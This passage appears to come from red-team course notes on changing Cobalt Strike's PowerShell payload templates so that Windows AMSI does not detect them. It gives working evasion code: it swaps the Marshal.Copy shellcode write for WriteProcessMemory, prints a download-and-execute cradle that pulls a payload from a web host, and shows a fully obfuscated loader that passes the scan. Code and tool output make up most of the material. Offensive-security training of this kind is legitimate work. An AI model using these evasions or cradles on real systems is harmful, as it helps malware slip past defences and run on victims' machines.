
The other type of stage0 template that Cobalt Strike provides are for script-based payloads such as PowerShell.  Where the artifact kit is used to modify the compiled templates, the resource kit is used to modify the script templates.  [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) is the primary concern when it comes to PowerShell because it can detect scripts running in memory.

Let's begin by generating a new set of resources without changing anything. The build script for the resource kit only requires an output directory.

```powershell
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource$ ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
[Resource Kit] [+] Copy the resource files
[Resource Kit] [+] Generate the resources.cna from the template file.
[Resource Kit] [+] The resource kit files are saved in '/mnt/c/Tools/cobaltstrike/custom-resources'
```

```powershell
PS C:\Tools\cobaltstrike\custom-resources> ls

    Directory: C:\Tools\cobaltstrike\custom-resources

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        19/03/2025     13:24            205 compress.ps1
-a----        19/03/2025     13:24           6691 resources.cna
-a----        19/03/2025     13:24            830 template.exe.hta
-a----        19/03/2025     13:24           2719 template.hint.x64.ps1
-a----        19/03/2025     13:24           2835 template.hint.x86.ps1
-a----        19/03/2025     13:24            197 template.psh.hta
-a----        19/03/2025     13:24            635 template.py
-a----        19/03/2025     13:24           1017 template.vbs
-a----        19/03/2025     13:24           2362 template.x64.ps1
-a----        19/03/2025     13:24           2482 template.x86.ps1
-a----        19/03/2025     13:24           3856 template.x86.vba
```

####  template.x64.ps1

This template is used to generate 64-bit stageless PowerShell payloads for workflows such as `jump winrm64`.  Scanning it with TheatCheck's AMSI engine shows that it gets detected even without weaponised shellcode being patched into it.

```powershell
PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
[+] Target file size: 2364 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x85B
0000075B   28 66 75 6E 63 5F 67 65  74 5F 70 72 6F 63 5F 61   (func_get_proc_a
0000076B   64 64 72 65 73 73 20 6B  65 72 6E 65 6C 33 32 2E   ddress kernel32.
0000077B   64 6C 6C 20 56 69 72 74  75 61 6C 41 6C 6C 6F 63   dll VirtualAlloc
0000078B   29 2C 20 28 66 75 6E 63  5F 67 65 74 5F 64 65 6C   ), (func_get_del
0000079B   65 67 61 74 65 5F 74 79  70 65 20 40 28 5B 49 6E   egate_type @([In
000007AB   74 50 74 72 5D 2C 20 5B  55 49 6E 74 33 32 5D 2C   tPtr], [UInt32],
000007BB   20 5B 55 49 6E 74 33 32  5D 2C 20 5B 55 49 6E 74    [UInt32], [UInt
000007CB   33 32 5D 29 20 28 5B 49  6E 74 50 74 72 5D 29 29   32]) ([IntPtr]))
000007DB   29 0A 09 24 76 61 72 5F  62 75 66 66 65 72 20 3D   )..$var_buffer =
000007EB   20 24 76 61 72 5F 76 61  2E 49 6E 76 6F 6B 65 28    $var_va.Invoke(
000007FB   5B 49 6E 74 50 74 72 5D  3A 3A 5A 65 72 6F 2C 20   [IntPtr]::Zero,
0000080B   24 76 5F 63 6F 64 65 2E  4C 65 6E 67 74 68 2C 20   $v_code.Length,
0000081B   30 78 33 30 30 30 2C 20  30 78 34 30 29 0A 09 0A   0x3000, 0x40)...
0000082B   09 5B 53 79 73 74 65 6D  2E 52 75 6E 74 69 6D 65   .[System.Runtime
0000083B   2E 49 6E 74 65 72 6F 70  53 65 72 76 69 63 65 73   .InteropServices
0000084B   2E 4D 61 72 73 68 61 6C  5D 3A 3A 43 6F 70 79 28   .Marshal]::Copy(
[*] Run time: 0.93s
```

These files are significantly easier to analyse for us because they're just text, so we can open them in a tool like PowerShell ISE or VS Code and find the offending portion.  In this case, it seems to be alerting on line 32, which is where the .NET [Marshal.Copy](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy) method is being called to copy the Beacon shellcode into memory.

![[Pasted image 20250727224729.png]]

We can remove this altogether and replace it with a call to the native [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API instead.

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

Now, no threat is found.

```powershell
PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
[+] No threat found!
[*] Run time: 0.19s
```

As with the artifact kit, we need to load `resources.cna` into the client before these new resources will be used.

####  compress.ps1

This script is used in places like when hosting a PowerShell payload via Cobalt Strike's Scripted Web Delivery attack.  It will take `template.[x64/x86].ps1` depending on the payload architecture, GZIP compresses and base64 encodes it, then patches it into `compress.ps1`.

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

ThreatCheck will not detect this template by itself.

```powershell
PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\compress.ps1 -e amsi
status value: AmsiResultNotDetected
[+] No threat found!
[*] Run time: 0.18s
```

However, if we host a payload using the scripted web delivery and try to execute it, then it will be detected.

```powershell
PS C:\Users\Attacker> IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a'))
IEX : At line:1 char:1
+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

A neat way to get around this is using old-fashioned obfuscation.  First, import Daniel Bohannon's [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) script.

```powershell
PS C:\Users\Attacker> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS C:\Users\Attacker> Invoke-Obfuscation
Invoke-Obfuscation>
```

The first thing we do is set the script block to be that of compress.ps1.

```powershell
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

Then we can apply any of the built-in obfuscations we like.  The only one we can't really do is string obfuscation on the `"%%DATA%%"` placeholder because Cobalt Strike relies on this to patch the shellcode into the correct spot.

Using token obfuscations, I ended up with the following:

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

Simply replace the content in `compress.ps1`, then host and test a new payload.

![[Pasted image 20250727225219.png]]

####  Multiple iterations

> ThreatCheck can only identify one 'bad part' of a file at a time.  It's common to patch out one detection, run ThreatCheck again, and find that a completely different one has popped up.  This is just the nature of the beast, and we just have to iterate over this process until all the known signatures have been removed.